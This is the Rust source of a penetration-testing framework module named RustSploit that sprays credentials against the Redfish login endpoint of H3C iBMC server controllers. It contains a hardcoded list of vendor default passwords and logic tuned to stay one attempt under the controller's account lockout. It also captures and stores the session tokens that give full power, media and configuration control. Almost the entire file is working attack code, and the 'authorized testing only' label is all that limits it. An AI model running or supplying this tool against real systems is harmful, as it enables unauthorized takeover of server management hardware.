//! H3C iBMC Redfish Session Credential Spray.
//!
//! H3C iBMC firmware exposes the standard Redfish session endpoint at
//!   `POST /redfish/v1/SessionService/Sessions`
//! that:
//!
//!   * accepts JSON credentials `{"UserName": "...", "Password": "..."}`;
//!   * returns `201 Created` with an `X-Auth-Token` header and `Location`
//!     header on success, `401 Unauthorized` or `403 Forbidden` on failure;
//!   * enforces an account lockout policy — on default H3C iBMC builds the
//!     BMC locks an account after **5 failed attempts** for a **5-second
//!     lockout duration** (discoverable via the AccountService resource).
//!
//! This module implements a **lockout-aware credential spray** strategy:
//!   * Tracks attempts per username and pauses for a configurable cooldown
//!     after `lockout_threshold` (default 4) consecutive failures on a
//!     given account — one attempt fewer than the BMC's hard limit.
//!   * Supports two ordering modes:
//!     - **spray** (default) — try password₁ against all users, then
//!       password₂ against all users, etc. This is the classic password-
//!       spray approach that distributes attempts across accounts.
//!     - **sequential** — try all passwords against user₁, then user₂,
//!       etc. Suitable when the operator knows lockout is disabled.
//!   * Honours `Retry-After` if the server surfaces a 429.
//!   * Persists discovered credentials via the project-wide credential
//!     store.
//!
//! FOR AUTHORIZED TESTING ONLY.

use anyhow::{anyhow, Context, Result};
use colored::*;
use std::collections::HashMap;
use std::time::Duration;

use crate::module::{Finding, FindingKind, ModuleCtx, ModuleOutcome};
use crate::module_info::{ModuleInfo, ModuleRank};
use crate::utils::network::{build_http_client_with, HttpClientOpts};
use crate::utils::{
    cfg_prompt_default,
    cfg_prompt_existing_file,
    cfg_prompt_int_range,
    cfg_prompt_yes_no,
    normalize_target,
};

const DEFAULT_PORT: u16 = 443;
const DEFAULT_PATH: &str = "/redfish/v1/SessionService/Sessions";
const DEFAULT_TIMEOUT_SECS: u64 = 10;
const DEFAULT_LOCKOUT_THRESHOLD: i64 = 4;
const DEFAULT_LOCKOUT_COOLDOWN_SECS: i64 = 6;

/// Built-in fallback credential pairs — mostly vendor defaults observed
/// across H3C-OEM hardware deployments.  Operators should prefer their own
/// wordlist via `userlist`/`passlist`.
const DEFAULT_CREDS: &[(&str, &str)] = &[
    ("admin", "admin"),
    ("admin", "Password@_"),
    ("admin", "Password@123"),
    ("admin", "h3capadmin"),
    ("admin", "Admin@9000"),
    ("Administrator", "Admin@9000"),
    ("Administrator", "Administrator"),
    ("sysadmin", "superuser"),
    ("root", "root"),
    ("root", "calvin"),
    ("operator", "operator"),
];

fn display_banner() {
    if crate::utils::is_batch_mode() { return; }
    crate::mprintln!("{}", "╔══════════════════════════════════════════════════════════════╗".red());
    crate::mprintln!("{}", "║   H3C iBMC Redfish Session Credential Spray                  ║".red().bold());
    crate::mprintln!("{}", "║   POST /redfish/v1/SessionService/Sessions                   ║".red());
    crate::mprintln!("{}", "║   Lockout-aware: pauses after N attempts per account          ║".red());
    crate::mprintln!("{}", "║   FOR AUTHORIZED TESTING ONLY                                ║".red());
    crate::mprintln!("{}", "╚══════════════════════════════════════════════════════════════╝".red());
    crate::mprintln!();
}

pub fn info() -> ModuleInfo {
    ModuleInfo {
        name: "H3C iBMC Redfish Session Credential Spray".to_string(),
        description: "Lockout-aware credential spray against the H3C iBMC Redfish session \
                      endpoint at POST /redfish/v1/SessionService/Sessions. Default H3C BMCs \
                      lock accounts after 5 failed attempts for 5 seconds; this module tracks \
                      per-account attempt counts and automatically pauses before triggering \
                      lockout. Supports spray (rotate users) and sequential ordering modes. \
                      A successful hit yields an X-Auth-Token granting full Redfish API access \
                      (power control, virtual media, configuration)."
            .to_string(),
        authors: vec!["RustSploit Contributors".to_string()],
        references: vec![
            "https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/".to_string(),
            "https://cwe.mitre.org/data/definitions/307.html".to_string(),
            "https://www.dmtf.org/standards/redfish".to_string(),
        ],
        disclosure_date: None,
        rank: ModuleRank::Excellent,
        default_port: None,
    }
}

pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
    let target = ctx
        .target
        .as_single()
        .context("h3c_redfish_session_spray requires a single-host target")?;

    display_banner();

    let mut outcome = ModuleOutcome::ok();
    let normalized = normalize_target(target)?;
    let host_input = if normalized.is_empty() {
        return Err(anyhow!("target is required"));
    } else {
        normalized
    };

    // ── Configuration prompts ───────────────────────────────────────────

    let port = cfg_prompt_int_range("port", "Target port", DEFAULT_PORT as i64, 1, 65535).await? as u16;
    let path = cfg_prompt_default("path", "API path", DEFAULT_PATH).await?;
    let timeout_secs = cfg_prompt_int_range("timeout", "Per-attempt timeout (seconds)", DEFAULT_TIMEOUT_SECS as i64, 1, 60).await? as u64;

    let lockout_threshold = cfg_prompt_int_range(
        "lockout_threshold",
        "Max attempts per account before cooldown (BMC locks at 5)",
        DEFAULT_LOCKOUT_THRESHOLD,
        1, 100,
    ).await? as u32;

    let lockout_cooldown_secs = cfg_prompt_int_range(
        "lockout_cooldown_secs",
        "Cooldown pause in seconds after threshold (BMC lockout is 5s)",
        DEFAULT_LOCKOUT_COOLDOWN_SECS,
        1, 300,
    ).await? as u64;

    let spray_mode = cfg_prompt_yes_no(
        "spray_mode",
        "Spray mode? (rotate users per password — safer for lockout avoidance)",
        true,
    ).await?;

    let stop_on_hit = cfg_prompt_yes_no("stop_on_hit", "Stop on first valid credential?", true).await?;
    let verbose = cfg_prompt_yes_no("verbose", "Verbose (log each attempt)", false).await?;

    let use_defaults = cfg_prompt_yes_no("use_defaults", "Try the built-in default credential list?", true).await?;
    let load_user_wordlist = cfg_prompt_yes_no("user_wordlist", "Load a username wordlist?", false).await?;
    let user_path = if load_user_wordlist {
        Some(cfg_prompt_existing_file("userlist", "Path to username wordlist").await?)
    } else { None };
    let load_pass_wordlist = cfg_prompt_yes_no("pass_wordlist", "Load a password wordlist?", false).await?;
    let pass_path = if load_pass_wordlist {
        Some(cfg_prompt_existing_file("passlist", "Path to password wordlist").await?)
    } else { None };

    // ── Build the candidate list ────────────────────────────────────────

    let mut pairs: Vec<(String, String)> = Vec::new();
    if use_defaults {
        for (u, p) in DEFAULT_CREDS { pairs.push((u.to_string(), p.to_string())); }
    }
    if let (Some(ufile), Some(pfile)) = (user_path.as_ref(), pass_path.as_ref()) {
        let users = read_lines(ufile).await?;
        let passwords = read_lines(pfile).await?;
        for u in &users {
            for p in &passwords {
                pairs.push((u.clone(), p.clone()));
            }
        }
    } else if let Some(pfile) = pass_path.as_ref() {
        let passwords = read_lines(pfile).await?;
        // Default to "admin" if only a password wordlist was given.
        let users: Vec<&str> = vec!["admin"];
        for u in &users {
            for p in &passwords {
                pairs.push((u.to_string(), p.clone()));
            }
        }
    } else if let Some(ufile) = user_path.as_ref() {
        let users = read_lines(ufile).await?;
        for u in &users {
            pairs.push((u.clone(), "admin".to_string()));
            pairs.push((u.clone(), "password".to_string()));
            pairs.push((u.clone(), u.clone()));
        }
    }

    if pairs.is_empty() {
        return Err(anyhow!("no candidate credentials configured — pick at least defaults or a wordlist"));
    }

    // ── Derive ordered attempt list based on spray vs sequential ────────

    let ordered_pairs: Vec<(String, String)> = if spray_mode {
        // Spray: try password₁ against all users, then password₂, etc.
        // Collect unique users and unique passwords (preserving order).
        let mut users: Vec<String> = Vec::new();
        let mut passwords: Vec<String> = Vec::new();
        let mut seen_users = std::collections::HashSet::new();
        let mut seen_passwords = std::collections::HashSet::new();
        for (u, p) in &pairs {
            if seen_users.insert(u.clone()) { users.push(u.clone()); }
            if seen_passwords.insert(p.clone()) { passwords.push(p.clone()); }
        }
        // Re-create the pair list in spray order: for each password, iterate
        // all users — but only include pairs that were in the original set.
        let pair_set: std::collections::HashSet<(String, String)> = pairs.iter().cloned().collect();
        let mut sprayed = Vec::new();
        for p in &passwords {
            for u in &users {
                if pair_set.contains(&(u.clone(), p.clone())) {
                    sprayed.push((u.clone(), p.clone()));
                }
            }
        }
        sprayed
    } else {
        // Sequential: original order (all passwords per user).
        pairs
    };

    let host = format!("{}:{}", strip_scheme(&host_input), port);
    let client = build_http_client_with(
        Duration::from_secs(timeout_secs),
        HttpClientOpts::permissive_unconditional(),
    ).context("Failed to build HTTP client")?;

    crate::mprintln!("{}", format!(
        "[*] Target: https://{}{}  ({} pair(s), mode={}, lockout_threshold={}, cooldown={}s)",
        host, path, ordered_pairs.len(),
        if spray_mode { "spray" } else { "sequential" },
        lockout_threshold, lockout_cooldown_secs,
    ).cyan());

    // ── Attempt loop with per-account lockout tracking ──────────────────

    // Track consecutive failed attempts per username.
    let mut attempt_counts: HashMap<String, u32> = HashMap::new();
    let mut found: Vec<(String, String, String)> = Vec::new();
    let mut tried = 0u64;

    'outer: for (user, pass) in &ordered_pairs {
        if ctx.is_cancelled() { break 'outer; }

        // Check if we need to cool down for this user.
        let count = attempt_counts.entry(user.clone()).or_insert(0);
        if *count >= lockout_threshold {
            crate::mprintln!("{}", format!(
                "[~] Lockout threshold ({}) reached for '{}' — cooling down {}s ...",
                lockout_threshold, user, lockout_cooldown_secs
            ).yellow());
            tokio::time::sleep(Duration::from_secs(lockout_cooldown_secs)).await;
            *count = 0;
        }

        tried += 1;
        ctx.rate_limit(target).await;

        match try_login(&client, &host, &path, user, pass).await {
            LoginResult::Success(token) => {
                crate::mprintln!("{}", format!(
                    "[+] HIT: {}:{} -> X-Auth-Token={}",
                    user, pass, token
                ).green().bold());

                // Reset the counter — credential is valid, no lockout concern.
                attempt_counts.insert(user.clone(), 0);

                if crate::cred_store::store_credential(crate::cred_store::NewCred {
                    host: &host, port, service: "redfish", username: user, secret: pass,
                    cred_type: crate::cred_store::CredType::Password,
                    source_module: "creds/generic/h3c_redfish_session_spray",
                }).await.is_none() { eprintln!("[!] Failed to store credential"); }

                outcome.findings.push(Finding {
                    target: target.to_string(),
                    kind: FindingKind::Credential,
                    message: format!(
                        "H3C iBMC Redfish session credentials valid {}:{} on {}",
                        user, pass, host
                    ),
                    data: Some(serde_json::json!({
                        "service": "redfish",
                        "port": port,
                        "username": user,
                        "password": pass,
                        "token": token,
                    })),
                });
                found.push((user.clone(), pass.clone(), token));
                if stop_on_hit { break 'outer; }
            }
            LoginResult::Denied => {
                // Increment the per-user failure counter.
                *attempt_counts.entry(user.clone()).or_insert(0) += 1;
                if verbose {
                    crate::mprintln!("{}", format!(
                        "[-] {}:{} — denied (attempt {}/{})",
                        user, pass,
                        attempt_counts.get(user).unwrap_or(&0),
                        lockout_threshold,
                    ).dimmed());
                }
            }
            LoginResult::RateLimited(wait_secs) => {
                crate::mprintln!("{}", format!(
                    "[~] 429 rate-limited — waiting {}s ...", wait_secs
                ).yellow());
                tokio::time::sleep(Duration::from_secs(wait_secs)).await;
                // Do not increment the failure counter for rate-limit responses;
                // the attempt was not actually evaluated by the BMC.
            }
            LoginResult::Error(msg) => {
                if verbose {
                    crate::mprintln!("{}", format!(
                        "[!] {}:{} — error: {}", user, pass, msg
                    ).red());
                }
            }
        }
    }

    // ── Summary ─────────────────────────────────────────────────────────

    crate::mprintln!();
    crate::mprintln!("{}", format!(
        "[*] {} attempts; {} valid credential(s)",
        tried, found.len()
    ).cyan().bold());

    if found.is_empty() {
        crate::mprintln!("{}", "[-] No valid credentials found.".yellow());
    }

    Ok(outcome)
}

// ── Login attempt helpers ───────────────────────────────────────────────

enum LoginResult {
    /// Successful authentication — carries the X-Auth-Token value.
    Success(String),
    /// 401 / 403 — invalid credentials.
    Denied,
    /// 429 — server asked us to back off.  Carries the wait duration in
    /// seconds (from Retry-After, capped at 60).
    RateLimited(u64),
    /// Transport or unexpected server error.
    Error(String),
}

/// Single login attempt against the Redfish session endpoint.
///
/// On success (HTTP 201), extracts the `X-Auth-Token` response header.
async fn try_login(
    client: &reqwest::Client,
    host: &str,
    path: &str,
    user: &str,
    pass: &str,
) -> LoginResult {
    let url = format!("https://{}{}", host, path);
    let body = serde_json::json!({
        "UserName": user,
        "Password": pass,
    });

    let resp = match client
        .post(&url)
        .header("Content-Type", "application/json")
        .json(&body)
        .send()
        .await
    {
        Ok(r) => r,
        Err(e) => return LoginResult::Error(format!("{}", e)),
    };

    let status = resp.status().as_u16();

    match status {
        201 => {
            // A genuine Redfish session-create returns 201 + X-Auth-Token. Without
            // that header it is NOT a usable session — don't store a credential on
            // a bare 201 (e.g. from a proxy/load-balancer). Previously a missing
            // token was stored as the literal "(header-missing)".
            match resp.headers().get("X-Auth-Token").map(|v| v.to_str()) {
                Some(Ok(tok)) if !tok.is_empty() => LoginResult::Success(tok.to_string()),
                Some(Err(e)) => {
                    tracing::debug!("X-Auth-Token header not UTF-8: {e}");
                    LoginResult::Error("X-Auth-Token header not readable".to_string())
                }
                _ => LoginResult::Error(
                    "201 Created without X-Auth-Token — not a valid session".to_string(),
                ),
            }
        }
        429 => {
            let wait = resp
                .headers()
                .get("Retry-After")
                .and_then(|v| v.to_str().ok())
                .and_then(|v| v.parse::<u64>().ok())
                .unwrap_or(5)
                .min(60);
            LoginResult::RateLimited(wait)
        }
        // Definitive negatives from a responding BMC (incl. 400/404/422 for a
        // malformed/missing-endpoint login) — Denied, not Error, so per-account
        // lockout tracking stays correct.
        400 | 401 | 403 | 404 | 422 => LoginResult::Denied,
        _ => LoginResult::Error(format!("unexpected HTTP {}", status)),
    }
}

// ── Utility helpers ─────────────────────────────────────────────────────

async fn read_lines(path: &str) -> Result<Vec<String>> {
    let content = tokio::fs::read_to_string(path).await
        .with_context(|| format!("read {}", path))?;
    Ok(content.lines()
        .map(|l| l.trim().to_string())
        .filter(|l| !l.is_empty() && !l.starts_with('#'))
        .collect())
}

fn strip_scheme(host: &str) -> String {
    let mut t = host.trim().to_string();
    for prefix in &["https://", "http://"] {
        if let Some(stripped) = t.strip_prefix(prefix) {
            t = stripped.to_string();
            break;
        }
    }
    if let Some(slash) = t.find('/') { t.truncate(slash); }
    if let Some(colon) = t.find(':') { t.truncate(colon); }
    t
}

crate::register_native_module!(crate::module::Category::Creds, "generic/h3c_redfish_session_spray", native);
